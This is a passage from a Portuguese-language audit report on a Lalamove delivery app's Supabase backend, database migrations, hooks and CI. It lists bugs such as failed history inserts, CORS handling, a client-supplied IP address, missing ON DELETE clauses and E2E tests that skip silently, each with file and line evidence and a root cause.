- **Etapas do plano:** 051

#### M-027 — A troca de motorista tenta gravar o historico em colunas que nao existem (lalamove_id, changed_at) e sem order_id, que e NOT NULL

- **Camada:** Backend — edges Lalamove
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Toda vez que alguem troca o motorista de uma entrega, o registro de 'quem foi trocado, por que e quando' nao e salvo. Em reclamacao de cliente ou disputa com a Lalamove nao ha historico para mostrar, e a linha do tempo do pedido na tela fica com um buraco.
- **Evidência:**
  ```
  supabase/functions/lalamove-api/index.ts:1073-1078; supabase/migrations/20251224143803_*.sql:147-154 (order_id NOT NULL; sem lalamove_id/changed_at); supabase/migrations/20251224181640_*.sql:25-28 (old_status/changed_by/change_reason); supabase/migrations/20261122120100_lalamove_integration_columns.sql:53-63 (status virou text — 'DRIVER_CHANGED' é aceito). Nenhuma migration cria `changed_at`.
  ```
- **Causa raiz:** O insert foi escrito com o vocabulario de outra tabela (lalamove_orders usa lalamove_id). Sao tres erros na mesma chamada: coluna inexistente `lalamove_id`, coluna inexistente `changed_at` e ausencia de `order_id`, que e NOT NULL. O PostgREST recusa o insert, e como o retorno nao e verificado (diferente do resto do arquivo), a falha e invisivel. Compare com o webhook, que faz o insert correto em lalamove-webhook/index.ts:327-330 usando `order_id`, `old_status` e `change_reason`.
- **Arquivos:** `supabase/functions/lalamove-api/index.ts`, `supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql`, `supabase/migrations/20251224181640_86877442-4075-4c58-8fcf-7a698b3af567.sql`
- **Etapas do plano:** 106

#### M-118 — Prova de entrega sem stopIndex sobrescreve TODAS as paradas do pedido com a mesma imagem e o mesmo status

- **Camada:** Backend — edges Lalamove
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Em entrega com varias paradas, a foto e o status de entrega de uma parada viram a prova de todas. O comprovante de entrega deixa de servir como prova: nao da para saber qual cliente recebeu, e uma parada que falhou pode aparecer como entregue.
- **Evidência:**
  ```
  supabase/functions/lalamove-webhook/index.ts:672-688 (filtro de parada condicional) · :737 (POP com default 0) · supabase/migrations/20261122120100_lalamove_integration_columns.sql:46-51 (coluna stop_id + indice unico order_id/stop_index)
  ```
- **Causa raiz:** Quando `stopIndex` nao vem como numero no payload (ausente, string, ou so `stopId`), o filtro por parada simplesmente nao e aplicado e o UPDATE passa a valer para o pedido inteiro. O handler ate tem o `stopId` em maos (:673) mas nunca o usa para localizar a parada — e a coluna existe no banco desde migrations/20261122120100_lalamove_integration_columns.sql:51-52 (`ADD COLUMN IF NOT EXISTS stop_id text`). Note o contraste com POP_STATUS_CHANGED, que usa default 0 (:737) em vez de null — as duas escolhas estao erradas de jeitos diferentes.
- **Arquivos:** `supabase/functions/lalamove-webhook/index.ts`, `supabase/migrations/20261122120100_lalamove_integration_columns.sql`
- **Etapas do plano:** 242

#### B-016 — CORS: a configuracao de origens so respeita a primeira da lista, e duas das cinco funcoes liberam qualquer origem de forma fixa

- **Camada:** Backend — edges Lalamove
- **Severidade:** Baixa · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Se um dia for preciso servir o app por mais de um endereco (preview, dominio novo, app interno), as chamadas do segundo endereco vao falhar no navegador sem erro claro, e o diagnostico vai custar horas. Risco de seguranca direto e pequeno (o token nao viaja sozinho), mas a configuracao da a falsa impressao de estar restrita.
- **Evidência:**
  ```
  supabase/functions/lalamove-webhook/index.ts:14-18; lalamove-api/index.ts:15-19; lalamove-uapi/index.ts:13-17; _shared/cors.ts:4-7; lalamove-gateway/index.ts:2 e 13-18; lalamove-token-refresh/index.ts:2.
  ```
- **Causa raiz:** A leitura da variavel pega apenas o indice 0 em vez de comparar com o `Origin` da requisicao, entao configurar duas origens (producao + preview da Vercel, por exemplo) faz a segunda falhar silenciosamente no navegador. E se `ALLOWED_ORIGINS` nao estiver definida, o default e `*`. Nas duas funcoes que usam o helper do supabase-js nao ha configuracao nenhuma: e `*` sempre.
- **Arquivos:** `supabase/functions/lalamove-webhook/index.ts`, `supabase/functions/lalamove-api/index.ts`, `supabase/functions/lalamove-uapi/index.ts`, `supabase/functions/lalamove-gateway/index.ts`, `supabase/functions/lalamove-token-refresh/index.ts`, `supabase/functions/_shared/cors.ts`
- **Etapas do plano:** 198
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Nao consigo listar os secrets do projeto de producao (nenhum MCP aponta para iecgydonctmabiijadsf), entao nao sei se `ALLOWED_ORIGINS` esta definida hoje nem com quantas origens — se tiver uma so, o efeito pratico atual e nulo e o achado e so de acabamento.


## Backend — notificação e fila

**1 achado(s).**


#### A-045 — A edge `new-device-alert` publicada responde 500 em vez de 422 — o alerta de login em dispositivo novo não é enviado

- **Camada:** Backend — notificação e fila
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Ninguém recebe o aviso de "login de um dispositivo novo". Um acesso a partir de máquina desconhecida passa calado, que é exatamente o cenário para o qual esse alerta existe.
- **Evidência:**
  ```
  Log do job `Deno Edge Function I/O Integration Tests` do run #987 (contra as edges **publicadas**): três casos falham com `AssertionError: Values are not equal: esperado 422, recebido 500 ({"error":"Internal server error"})` — "campo ausente → 422 formato único", "tipo incorreto → 422 no campo userEmail" e "compat: v1 e v2 rejeitam o inválido identicamente". O corpo `{"error":"Internal server error"}` é byte-idêntico ao do `catch` em `supabase/functions/new-device-alert/index.ts:281-284`. No código, a validação que deveria devolver 422 vem DEPOIS: `parseJsonBody` em `:46` e `validateContract` em `:51`; antes delas, `:42` executa `const resend = new Resend(Deno.env.get("RESEND_API_KEY")!)`.
  ```
- **Causa raiz:** O cliente do serviço de e-mail é construído no topo do `try`, antes de qualquer validação. Se `RESEND_API_KEY` estiver ausente ou inválida em produção, o construtor lança e TODA requisição cai no `catch` genérico, que responde 500 — inclusive as válidas. É a única edge do repo que constrói esse cliente (`grep -rn "new Resend("` → 1 ocorrência).
- **Arquivos:** `supabase/functions/new-device-alert/index.ts`
- **Etapas do plano:** 084


## Banco — RLS e autorização

**1 achado(s).**


#### M-002 — Fila de aprovação de reset de senha não tem produtor: a única policy de INSERT exige usuário logado, mas o fluxo é pré-login

- **Camada:** Banco — RLS e autorização
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A tela de aprovação de reset de senha, que está no menu para administradores, mostra sempre uma lista vazia — a funcionalidade parece existir e não existe. Quem contar com ela para controlar trocas de senha está contando com um controle que nunca é acionado.
- **Evidência:**
  ```
  supabase/migrations/20260315151153_789547cf-e79d-4291-8123-61567f7973e1.sql:26-32 `CREATE POLICY "Users can request own password reset" ON public.password_reset_requests FOR INSERT TO authenticated WITH CHECK ( user_email = (SELECT email FROM auth.users WHERE id = auth.uid()) );` vs src/pages/ForgotPasswordPage.tsx:34 `const { error: resetError } = await supabase.auth.resetPasswordForEmail(email, {`.
  ```
- **Causa raiz:** A policy de INSERT foi desenhada para um fluxo em que o usuário logado pede o reset do próprio e-mail, mas a tela de "esqueci minha senha" roda sem login e foi implementada com `resetPasswordForEmail` do Supabase Auth, que não escreve nessa tabela. Nenhuma edge function grava nela. Resultado: a condição da policy é insatisfazível no fluxo real e a fila nunca recebe linhas.
- **Arquivos:** `supabase/migrations/20260315151153_789547cf-e79d-4291-8123-61567f7973e1.sql`, `src/pages/ForgotPasswordPage.tsx`, `src/pages/PasswordResetApprovalsPage.tsx`, `src/hooks/usePasswordResetActions.ts`, `supabase/migrations/20251231131206_017e19aa-c6cc-438f-a6ac-b3ec6f486172.sql`
- **Etapas do plano:** 040


## Banco — integridade e índices

**3 achado(s).**


#### B-032 — Cinco índices redundantes: duplicam o prefixo de um índice único ou composto já existente

- **Camada:** Banco — integridade e índices
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Cada gravação nessas tabelas atualiza um índice a mais sem necessidade — inclui a tabela de webhooks, que recebe todos os eventos da Lalamove. Custa escrita e espaço em disco, sem nenhum ganho de consulta.
- **Evidência:**
  ```
  Restam 3 índices redundantes, não 5: supabase/migrations/20251224181603_0ace1e1d-c3a8-4569-b3ec-02bdee6d54c9.sql:46 (idx_webhooks_type) vs 20260723172904_f9756817-8a17-405c-98a6-c5f8b344caa2.sql:3; 20260712195355_29d8addb-637f-453a-a340-408fab3d621b.sql:27 vs 20260712200027_6900097d-9856-4269-be08-62c31400f688.sql:1-4; 20260723130425_76481d2c-7b89-4ed7-9e3c-b89a98051ac3.sql:16 vs o UNIQUE de :10. Já resolvidos: idx_orders_lalamove_id (dropado em 20260813143344_cc47eddb-ab94-4fd2-88c4-c1b0c4e9c1c0.sql:11) e idx_drivers_lalamove_id (dropado em 20260723174458_e560333f-b0f9-4563-96a8-8303780ef30f.sql:4).
  ```
- **Causa raiz:** Constraint UNIQUE já cria um índice próprio (`<tabela>_<coluna>_key`), e um índice composto atende todas as consultas que usam só a primeira coluna. Nos cinco casos foi criado um índice extra sobre a mesma chave, em migrations diferentes, sem dropar o anterior — nos casos (3) e (4) a migration nova veio justamente para substituir a antiga e esqueceu o DROP.
- **Arquivos:** `supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql`, `supabase/migrations/20251224181603_0ace1e1d-c3a8-4569-b3ec-02bdee6d54c9.sql`, `supabase/migrations/20260723172904_f9756817-8a17-405c-98a6-c5f8b344caa2.sql`, `supabase/migrations/20260712195355_29d8addb-637f-453a-a340-408fab3d621b.sql`, `supabase/migrations/20260723130425_76481d2c-7b89-4ed7-9e3c-b89a98051ac3.sql`
- **Etapas do plano:** 232

#### B-033 — Trigger de auditoria da configuração de mapas grava resource_id aleatório porque a coluna é uuid NOT NULL

- **Camada:** Banco — integridade e índices
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A auditoria registra que alguém mudou a configuração de mapas, mas não registra o quê de forma consultável: para saber se foi a troca de provedor de rota ou o orçamento do Google é preciso abrir o JSON linha a linha. Filtrar o histórico de um item específico fica impossível e o índice criado para isso não serve para nada.
- **Evidência:**
  ```
  supabase/migrations/20261122130100_geo_foundation.sql:610-617 (trigger) e :618-626 (ligação aos 3 triggers); PKs em :21, :46, :146; `resource_id UUID NOT NULL` em supabase/migrations/20261121192500_restore_audit_log.sql:20 e supabase/migrations/20251226000002_create_audit_log.sql:7; índice em 20261121192500:28
  ```
- **Causa raiz:** audit_log foi modelada supondo que todo recurso auditável tem id UUID. Como geo_settings/geo_budget/geo_defaults são chaveadas por texto, o trigger não tem UUID para informar e, por causa do NOT NULL, inventa um com gen_random_uuid() a cada linha. A identificação do recurso sobra apenas dentro do JSON de `changes`.
- **Arquivos:** `supabase/migrations/20261122130100_geo_foundation.sql`, `supabase/migrations/20261121192500_restore_audit_log.sql`, `supabase/migrations/20251226000002_create_audit_log.sql`
- **Etapas do plano:** 233

#### B-040 — Nove chaves estrangeiras para auth.users sem ON DELETE — apagar um usuário falha

- **Camada:** Banco — integridade e índices
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Não dá para desligar de vez a conta de alguém que saiu da empresa nem atender a um pedido de exclusão de dados: o painel do Supabase devolve erro de chave estrangeira e exige limpeza manual tabela por tabela. Em compensação, apagar à força levaria junto a trilha de auditoria — por isso o certo é SET NULL, não CASCADE.
- **Evidência:**
  ```
  supabase/migrations/20251226000001_create_system_logs.sql:8; 20251226000002_create_audit_log.sql:4; 20251226010000_create_job_queue_system.sql:58 (não listado pelo auditor); 20251231131206_017e19aa-c6cc-438f-a6ac-b3ec6f486172.sql:7; 20261122120100_lalamove_integration_columns.sql:72; 20261122120200_job_queue_system.sql:34 e :47; 20261122130100_geo_foundation.sql:27, :55, :151. Padrão correto já adotado em 20261121192500_restore_audit_log.sql:17 e 20260723132716_148d4e3d-b62f-45d2-b4f6-35f3ffb33cdd.sql:5
  ```
- **Causa raiz:** Sem cláusula explícita o Postgres assume NO ACTION: a exclusão da linha referenciada é recusada enquanto houver referência. Como essas colunas registram quem fez o quê (log de sistema, auditoria, quem mudou a configuração de mapa, quem enfileirou job), todo usuário que já agiu no sistema acumula referências e passa a ser indeletável.
- **Arquivos:** `supabase/migrations/20251226000001_create_system_logs.sql`, `supabase/migrations/20251226000002_create_audit_log.sql`, `supabase/migrations/20251231131206_017e19aa-c6cc-438f-a6ac-b3ec6f486172.sql`, `supabase/migrations/20261122120100_lalamove_integration_columns.sql`, `supabase/migrations/20261122120200_job_queue_system.sql`, `supabase/migrations/20261122130100_geo_foundation.sql`
- **Etapas do plano:** 260


## Documentação × código

**4 achado(s).**


#### A-027 — mensageria.md manda o plantao olhar o ledger notification_messages e a edge zapp-callback; nenhum dos dois existe no repo

- **Camada:** Documentação × código (+ 1 outro(s) local)
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Em incidente de mensageria, quem esta de plantao vai procurar as mensagens enviadas numa tabela que nao existe e vai olhar o log de uma funcao que nunca foi criada, concluindo "o provedor esta fora" quando na verdade nao existe caminho de retorno nenhum: nenhuma resposta de motorista e nenhum status entregue/lido chega ao sistema hoje.
- **Evidência:**
  ```
  docs/agentes/mensageria.md:13-17 e :43-47 contra: ausencia do diretorio supabase/functions/zapp-callback; zero CREATE TABLE notification_messages em supabase/migrations/ e inexistencia de 20261125120000_* (ultima = 20261124120000_internal_alert_channels.sql); supabase/functions/send-notification/index.ts:597 (comentario "o ledger novo (etapa 73) ainda nao esta em uso"), :649 e :1058 (`.from("alerts_sent")`); supabase/functions/_shared/messaging/inbound-actions.ts:5 ("o chamador (`zapp-callback`, etapa 96)") sem nenhum importador fora de _shared/messaging.
  ```
  Mesma causa, outro local — Backend — notificação e fila:
  ```
  docs/agentes/mensageria.md:13-15 `4. O que foi enviado e o que voltou fica no ledger `notification_messages` (migration `20261125120000_notification_ledger.sql`). … 5. A resposta do motorista chega pelo `zapp-callback`, é classificada (`_shared/messaging/inbound.ts`)` — contra `ls supabase/functions/` (sem `zapp-callback`), `ls supabase/migrations/` (último arquivo `20261124120000_internal_alert_channels.sql`) e `find supabase -name security.ts` (só `lalamove-webhook/security.ts`).
  ```
- **Causa raiz:** O runbook foi escrito a partir do plano de 150 etapas, descrevendo o estado alvo como se fosse o estado atual. A edge zapp-callback e a etapa 96 (citada em supabase/functions/_shared/messaging/inbound-actions.ts:5 como "o chamador (`zapp-callback`, etapa 96)") e o ledger e a etapa 73 — as duas ainda nao existem. A secao "O que ainda não existe" (:66-71) lista as etapas 133-138 mas omite justamente o ledger e o callback.
- **Arquivos:** `docs/agentes/mensageria.md`, `supabase/functions/_shared/messaging/inbound-actions.ts`, `supabase/functions/_shared/messaging/inbound.ts`, `supabase/functions/send-notification/index.ts`
- **Etapas do plano:** 065

#### B-006 — Artefatos gerados e commitados estão desatualizados: o inventário diz 54 rotas e 20 problemas, o real é 56 e 0

- **Camada:** Documentação × código
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O inventário é o mapa que um agente de IA lê para saber o que existe no sistema. Desatualizado, ele aponta problemas já corrigidos (20 que não existem mais) e esconde o que mudou — fazendo o agente trabalhar no lugar errado.
- **Evidência:**
  ```
  Rodado nesta sessão: `node scripts/inventario/gerar-rotas.mjs` regenera `inventario/estado/rotas.json` com **834 linhas de diferença** (o commitado diz `"rotas": 54` e `"problemas": 20`; o real é 56 rotas e 0 problemas). `node scripts/ci/gerar-matriz-edge-tabela.mjs` regenera `docs/ci/MATRIZ_EDGE_TABELA.md` com 12 inserções e 10 remoções (faltavam `geo-admin`, `driver_locations`/`alert_configurations` em `job-worker`, `alerts` em `lalamove-api`, `active_tracking`/`drivers`/`lalamove_orders` em `send-notification`). Os dois arquivos foram revertidos ao estado do commit — nada ficou alterado na branch desta auditoria.
  ```
- **Causa raiz:** Os geradores existem e funcionam, mas nenhum workflow os roda em modo `--check` na PR. O `inventario-estado-semanal.yml` só roda segunda-feira e abre PR própria (que, pelos required checks, não tem CI e não pode ser mergeada).
- **Arquivos:** `inventario/estado/rotas.json`, `inventario/estado/edges.json`, `docs/ci/MATRIZ_EDGE_TABELA.md`, `scripts/inventario/gerar-rotas.mjs`, `scripts/ci/gerar-matriz-edge-tabela.mjs`
- **Etapas do plano:** 161

#### B-035 — O comentário do workflow de contexto diz "a cada 10 min"; o agendamento é horário

- **Camada:** Documentação × código
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Quem lê o cabeçalho para saber de quando é o contexto que os agentes consomem acredita que o dado tem no máximo 10 minutos, quando pode ter quase uma hora.
- **Evidência:**
  ```
  `.github/workflows/contexto.yml:2` — "gatilho: push em main que toque código … ; **a cada 10 min** (minuto 3); dispatch" — contra `:48` — `- cron: '3 * * * *'` (uma vez por hora, no minuto 3). A API do GitHub mostra 933 execuções acumuladas desse workflow.
  ```
- **Causa raiz:** O comentário do cabeçalho ficou da versão anterior do agendamento e não foi corrigido quando o cron mudou para horário.
- **Arquivos:** `.github/workflows/contexto.yml`
- **Etapas do plano:** 235

#### B-051 — `SUPABASE_ACCESS_TOKEN` existe há dois dias, mas o workflow que depende dele afirma que não está configurado

- **Camada:** Documentação × código
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O inventário semanal do banco provavelmente já está rodando e ninguém sabe; e o repositório guarda chaves de dois outros sistemas, aumentando o estrago caso o acesso ao repositório seja comprometido.
- **Evidência:**
  ```
  `GET /repos/adm01-debug/Lalamove_V2/actions/secrets` (API do GitHub): `SUPABASE_ACCESS_TOKEN` criado em `2026-11-21T16:05:04Z`. O cabeçalho de `.github/workflows/inventario-estado-semanal.yml` diz: "SUPABASE_ACCESS_TOKEN (opcional, ainda NÃO configurado neste repo): … Sem ele o passo do banco é pulado com aviso". O mesmo levantamento mostra que o repositório guarda segredos de OUTROS projetos: `PROMO_GIFTS_SUPABASE_SECRET_KEY`, `PROMO_GIFTS_SUPABASE_URL`, `SINGU_SUPABASE_SECRET_KEY`, `SINGU_SUPABASE_URL`.
  ```
- **Causa raiz:** Comentário de workflow escrito antes do secret ser criado e nunca atualizado. Os segredos de outros projetos foram adicionados em 21/11 e ficaram.
- **Arquivos:** `.github/workflows/inventario-estado-semanal.yml`
- **Etapas do plano:** 288


## Hooks e estado — auth, permissão e infra

**4 achado(s).**


#### A-011 — Registro de dispositivo e alerta de "novo acesso" gravam sempre IP 0.0.0.0, vindo do cliente

- **Camada:** Hooks e estado — auth, permissão e infra
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O e-mail de "acesso de novo dispositivo" e a lista de dispositivos do usuário mostram sempre 0.0.0.0 e nenhuma cidade — ninguém consegue reconhecer se um acesso suspeito veio de fora. Pior: como o endereço vem do navegador, quem chamar a função direto pode registrar qualquer IP na trilha de auditoria.
- **Evidência:**
  ```
  src/hooks/useDeviceDetection.ts:73 `const ipAddress = '0.0.0.0';` · :78 `// Skip external IP geolocation APIs - they're unreliable and blocked by CORS` · :89 `ipAddress,` (corpo do invoke) || supabase/functions/new-device-alert/index.ts:117 `ip_address: ipAddress,` · :137 `ip_address: ipAddress,` · :214 `<td>${ipAddress}</td>` · :260 `ip_address: ipAddress,` || src/hooks/useAuthLogs.ts:54 `uniqueIPs: new Set(authLogs?.map(l => l.ip_address).filter(Boolean)).size,`
  ```
- **Causa raiz:** A captura de IP foi removida do cliente (comentário diz que APIs externas de geolocalização são bloqueadas por CORS) sem passar a responsabilidade para a edge function, que continua recebendo o IP como dado de entrada do navegador.
- **Arquivos:** `src/hooks/useDeviceDetection.ts`, `supabase/functions/new-device-alert/index.ts`, `src/hooks/useUserDevices.ts`
- **Etapas do plano:** 026

#### M-085 — Fila de jobs: "Deletar" e "Processar fila" não fazem nada mas confirmam sucesso, e o filtro de status ignora as avaliações

- **Camada:** Hooks e estado — auth, permissão e infra (+ 1 outro(s) local)
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Na tela de fila, apagar um job mostra "Job deletado" e o job continua lá; "Processar fila" sempre informa "0 jobs processados, 0 erros" como se tivesse rodado. E ao filtrar por "Pendentes" ou "Com falha" a lista vem poluída de avaliações já concluídas. O operador não consegue confiar na tela para saber se há trabalho travado.
- **Evidência:**
  ```
  src/hooks/useJobQueue.ts:317-318 `const deleteJob = async (jobId: string): Promise<void> => { logger.warn(\`Delete de job ${jobId} ignorado (jobs são registros históricos)\`); };`; :340 `return { processed: 0, errors: 0 };`; :159-163 consulta de `driver_evaluations` sem filtro e :170 `status: 'COMPLETED',`; src/pages/JobQueuePage.tsx:39 `toast.success('Job deletado');`
  ```
  Mesma causa, outro local — Interface — painéis e relatórios:
  ```
  src/hooks/useJobQueue.ts:339 `return { processed: 0, errors: 0 };`; :318 `logger.warn(\`Delete de job ${jobId} ignorado (jobs são registros históricos)\`);`; src/pages/JobQueuePage.tsx:39 `toast.success('Job deletado');`; :50 `toast.success(\`${result.processed} jobs processados, ${result.errors} erros\`);`
  ```
- **Causa raiz:** O hook foi montado como fachada sobre `webhook_events`/`bitrix24_sync`/`driver_evaluations` (comentário nas linhas 1-4) e três operações ficaram como simulação, sem que a UI soubesse. O filtro de status foi aplicado só nas duas tabelas que têm coluna de status.
- **Arquivos:** `src/hooks/useJobQueue.ts`, `src/pages/JobQueuePage.tsx`
- **Etapas do plano:** 180

#### M-119 — Tema agendado só funciona enquanto a tela de preferências está aberta: dois hooks de tema disputam a mesma classe com chaves diferentes

- **Camada:** Hooks e estado — auth, permissão e infra
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O usuário escolhe "tema escuro das 18h às 6h", vê funcionar na tela de preferências e, ao navegar para qualquer outra tela ou recarregar, o tema volta ao anterior. A configuração parece salva e não tem efeito.
- **Evidência:**
  ```
  src/hooks/useTheme.ts:4 `export type ThemeMode = 'light' | 'dark' | 'auto';` · :7 `const THEME_KEY = 'lalamove-guardian-theme';` · :46 `localStorage.setItem(THEME_KEY, mode);` || src/hooks/useScheduledTheme.ts:4 `export type ThemeMode = 'light' | 'dark' | 'auto' | 'scheduled';` · :27 `const stored = localStorage.getItem('theme-settings');` · :126 `localStorage.setItem('theme-settings', JSON.stringify(themeState));` || src/components/ui/sonner.tsx:7 `const { theme } = useTheme();` (Toaster em src/App.tsx:138) || src/pages/UserPreferencesPage.tsx:41 `const theme = useScheduledTheme();`
  ```
- **Causa raiz:** O modo "scheduled" só existe no hook da página de preferências (`ThemeMode` inclui `'scheduled'` em useScheduledTheme.ts:4, mas não em useTheme.ts:4). Fora daquela página ninguém lê `theme-settings`, e o `useTheme` global aplica o valor da sua própria chave.
- **Arquivos:** `src/hooks/useTheme.ts`, `src/hooks/useScheduledTheme.ts`, `src/pages/UserPreferencesPage.tsx`, `src/components/layout/Header.tsx`, `src/components/layout/Sidebar.tsx`
- **Etapas do plano:** 243

#### B-019 — O logout promete limpar as preferências da sessão anterior mas apaga apenas 2 de ~8 chaves

- **Camada:** Hooks e estado — auth, permissão e infra
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Em computador compartilhado, o próximo operador herda tema, idioma, volume e sons de alerta, limiares do mapa e o filtro de notificações do colega anterior — inclusive "modo silencioso" de alertas, que pode esconder avisos críticos de quem acabou de entrar.
- **Evidência:**
  ```
  src/hooks/useAuth.tsx:75-76 — `localStorage.removeItem('achievements'); localStorage.removeItem('achievement-points');` versus src/hooks/useAchievementsSystem.tsx:256-257 — `const achievementsKey = `achievements:${userId}`; const pointsKey = `achievement-points:${userId}`;` (as chaves gravadas têm sufixo de usuário, então a remoção do logout não acerta nenhuma delas)
  ```
- **Causa raiz:** As preferências foram implementadas hook por hook, cada uma com sua chave de localStorage e sem registro central; o logout só conhece as duas chaves do sistema de conquistas.
- **Arquivos:** `src/hooks/useAuth.tsx`, `src/hooks/useTheme.ts`, `src/hooks/useScheduledTheme.ts`, `src/hooks/useSoundSettings.ts`, `src/hooks/useMapSettings.ts`, `src/hooks/useRegionResolver.ts`, `src/hooks/usePushNotifications.ts`, `src/i18n/index.ts`
- **Etapas do plano:** 201


## Hooks e estado — dados de negócio

**1 achado(s).**


#### A-032 — Botão "Avaliar motorista" nunca mostra o resultado: o hook lê um formato de resposta que a edge evaluate-driver não devolve

- **Camada:** Hooks e estado — dados de negócio (+ 1 outro(s) local)
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Ao clicar em avaliar o motorista de um pedido, o sistema avalia de verdade (pode até bloquear o motorista no banco), mas a tela não mostra nada: nem score, nem aviso de bloqueio, nem erro. O operador acha que não funcionou e pode liberar um motorista crítico.
- **Evidência:**
  ```
  supabase/functions/evaluate-driver/index.ts:73-83 (interface achatada), :607-610, :631-634 e :794-797 `return new Response(\n      JSON.stringify(result),`; src/hooks/useEvaluateDriver.ts:69 `const { evaluation, driver } = data;`, :78 `if (evaluation.autoBlocked) {`, :93-95 `toast.error('Erro na Avaliação', { description: error.message })`; src/components/orders/OrderDetailModal.tsx:552 `riskScore: result.evaluation.riskAnalysis.score,` e :557-558 (catch com só `logger.error`); node_modules/@tanstack/query-core/build/modern/mutation.js:195 e :203-210 (throw no onSuccess cai no onError)
  ```
  Mesma causa, outro local — Regras de negócio — cálculos:
  ```
  supabase/functions/evaluate-driver/index.ts:794-795 — "return new Response(\n      JSON.stringify(result),"; mesmos retornos planos em :610 e :634. Interface plana em index.ts:73-84. src/hooks/useEvaluateDriver.ts:68 — "const { evaluation, driver } = data;" e :75 — "if (evaluation.autoBlocked) {". src/components/orders/OrderDetailModal.tsx:551-552 — "riskScore: result.evaluation.riskAnalysis.score,\n          riskLevel: result.evaluation.riskAnalysis.level,".
  ```
- **Causa raiz:** A interface declarada no hook (useEvaluateDriver.ts:30-47) inventa um envelope `{ success, evaluation: { riskAnalysis... }, driver }` que a função servidora nunca produziu — nem no caminho principal (:794) nem nos atalhos de blacklist (:610) e whitelist (:634). Como `supabase.functions.invoke` tipa `data` como any, o TypeScript não acusa. Em runtime `evaluation` é undefined: o onSuccess ainda invalida as queries (:72-75) e então estoura TypeError em `evaluation.autoBlocked`, sem nenhum toast; no componente o acesso a `result.evaluation.riskAnalysis` estoura antes do setEvaluationResult e o catch só faz logger.error (OrderDetailModal.tsx:556-558).
- **Arquivos:** `src/components/orders/OrderDetailModal.tsx`, `src/hooks/useEvaluateDriver.ts`, `supabase/functions/evaluate-driver/index.ts`
- **Etapas do plano:** 070


## Infra, CI e deploy

**8 achado(s).**


#### A-012 — O required check E2E passa sem exercitar RBAC e MFA: os testes autenticados fazem skip porque o ci.yml nao injeta a sessao

- **Camada:** Infra, CI e deploy (+ 1 outro(s) local)
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O teste que deveria provar que um operador nao acessa tela de admin e que o MFA barra o acesso nunca roda; uma regressao de permissao chega a producao com a CI verde.
- **Evidência:**
  ```
  e2e/helpers/auth.ts:19-22 — `const storageKey = process.env.LOVABLE_BROWSER_SUPABASE_STORAGE_KEY;` / `const sessionJson = process.env.LOVABLE_BROWSER_SUPABASE_SESSION_JSON;` / `if (!storageKey || !sessionJson) return null;`; e2e/rbac.e2e.ts:60 — `test.skip(!session, 'Requer sessão autenticada injetada para validar hierarquia de papéis.');`; .github/workflows/ci.yml:54-57 — `env:` / `CI: 'true'` / `VITE_SUPABASE_URL: ${{ secrets.VITE_SUPABASE_URL }}` / `VITE_SUPABASE_PUBLISHABLE_KEY: ${{ secrets.VITE_SUPABASE_PUBLISHABLE_KEY }}`
  ```
  Mesma causa, outro local — Testes:
  ```
  e2e/helpers/auth.ts:19-22; .github/workflows/ci.yml:52-57 (env só com VITE_*) e :58-64 (upload do report); skips em autocomplete.e2e.ts:50, livemap-route.e2e.ts:44, new-order-autocomplete.e2e.ts:64, mfa.e2e.ts:29, rbac.e2e.ts:60 e :74; playwright.config.ts:20.
  ```
- **Causa raiz:** Nenhuma das duas variaveis `LOVABLE_BROWSER_SUPABASE_*` e passada ao `npx playwright test` (ci.yml:52-57), e elas tambem nao existem no .env.example. Logo `getInjectedSession()` devolve null em todo run de CI e os 8 pontos de `test.skip` de rbac/mfa/autocomplete/livemap/new-order sao acionados. O Playwright conta skip como sucesso: o check `E2E (Playwright)` — um dos 7 required checks da main — fica verde tendo rodado apenas os fluxos nao autenticados (login-lockout, password-reset).
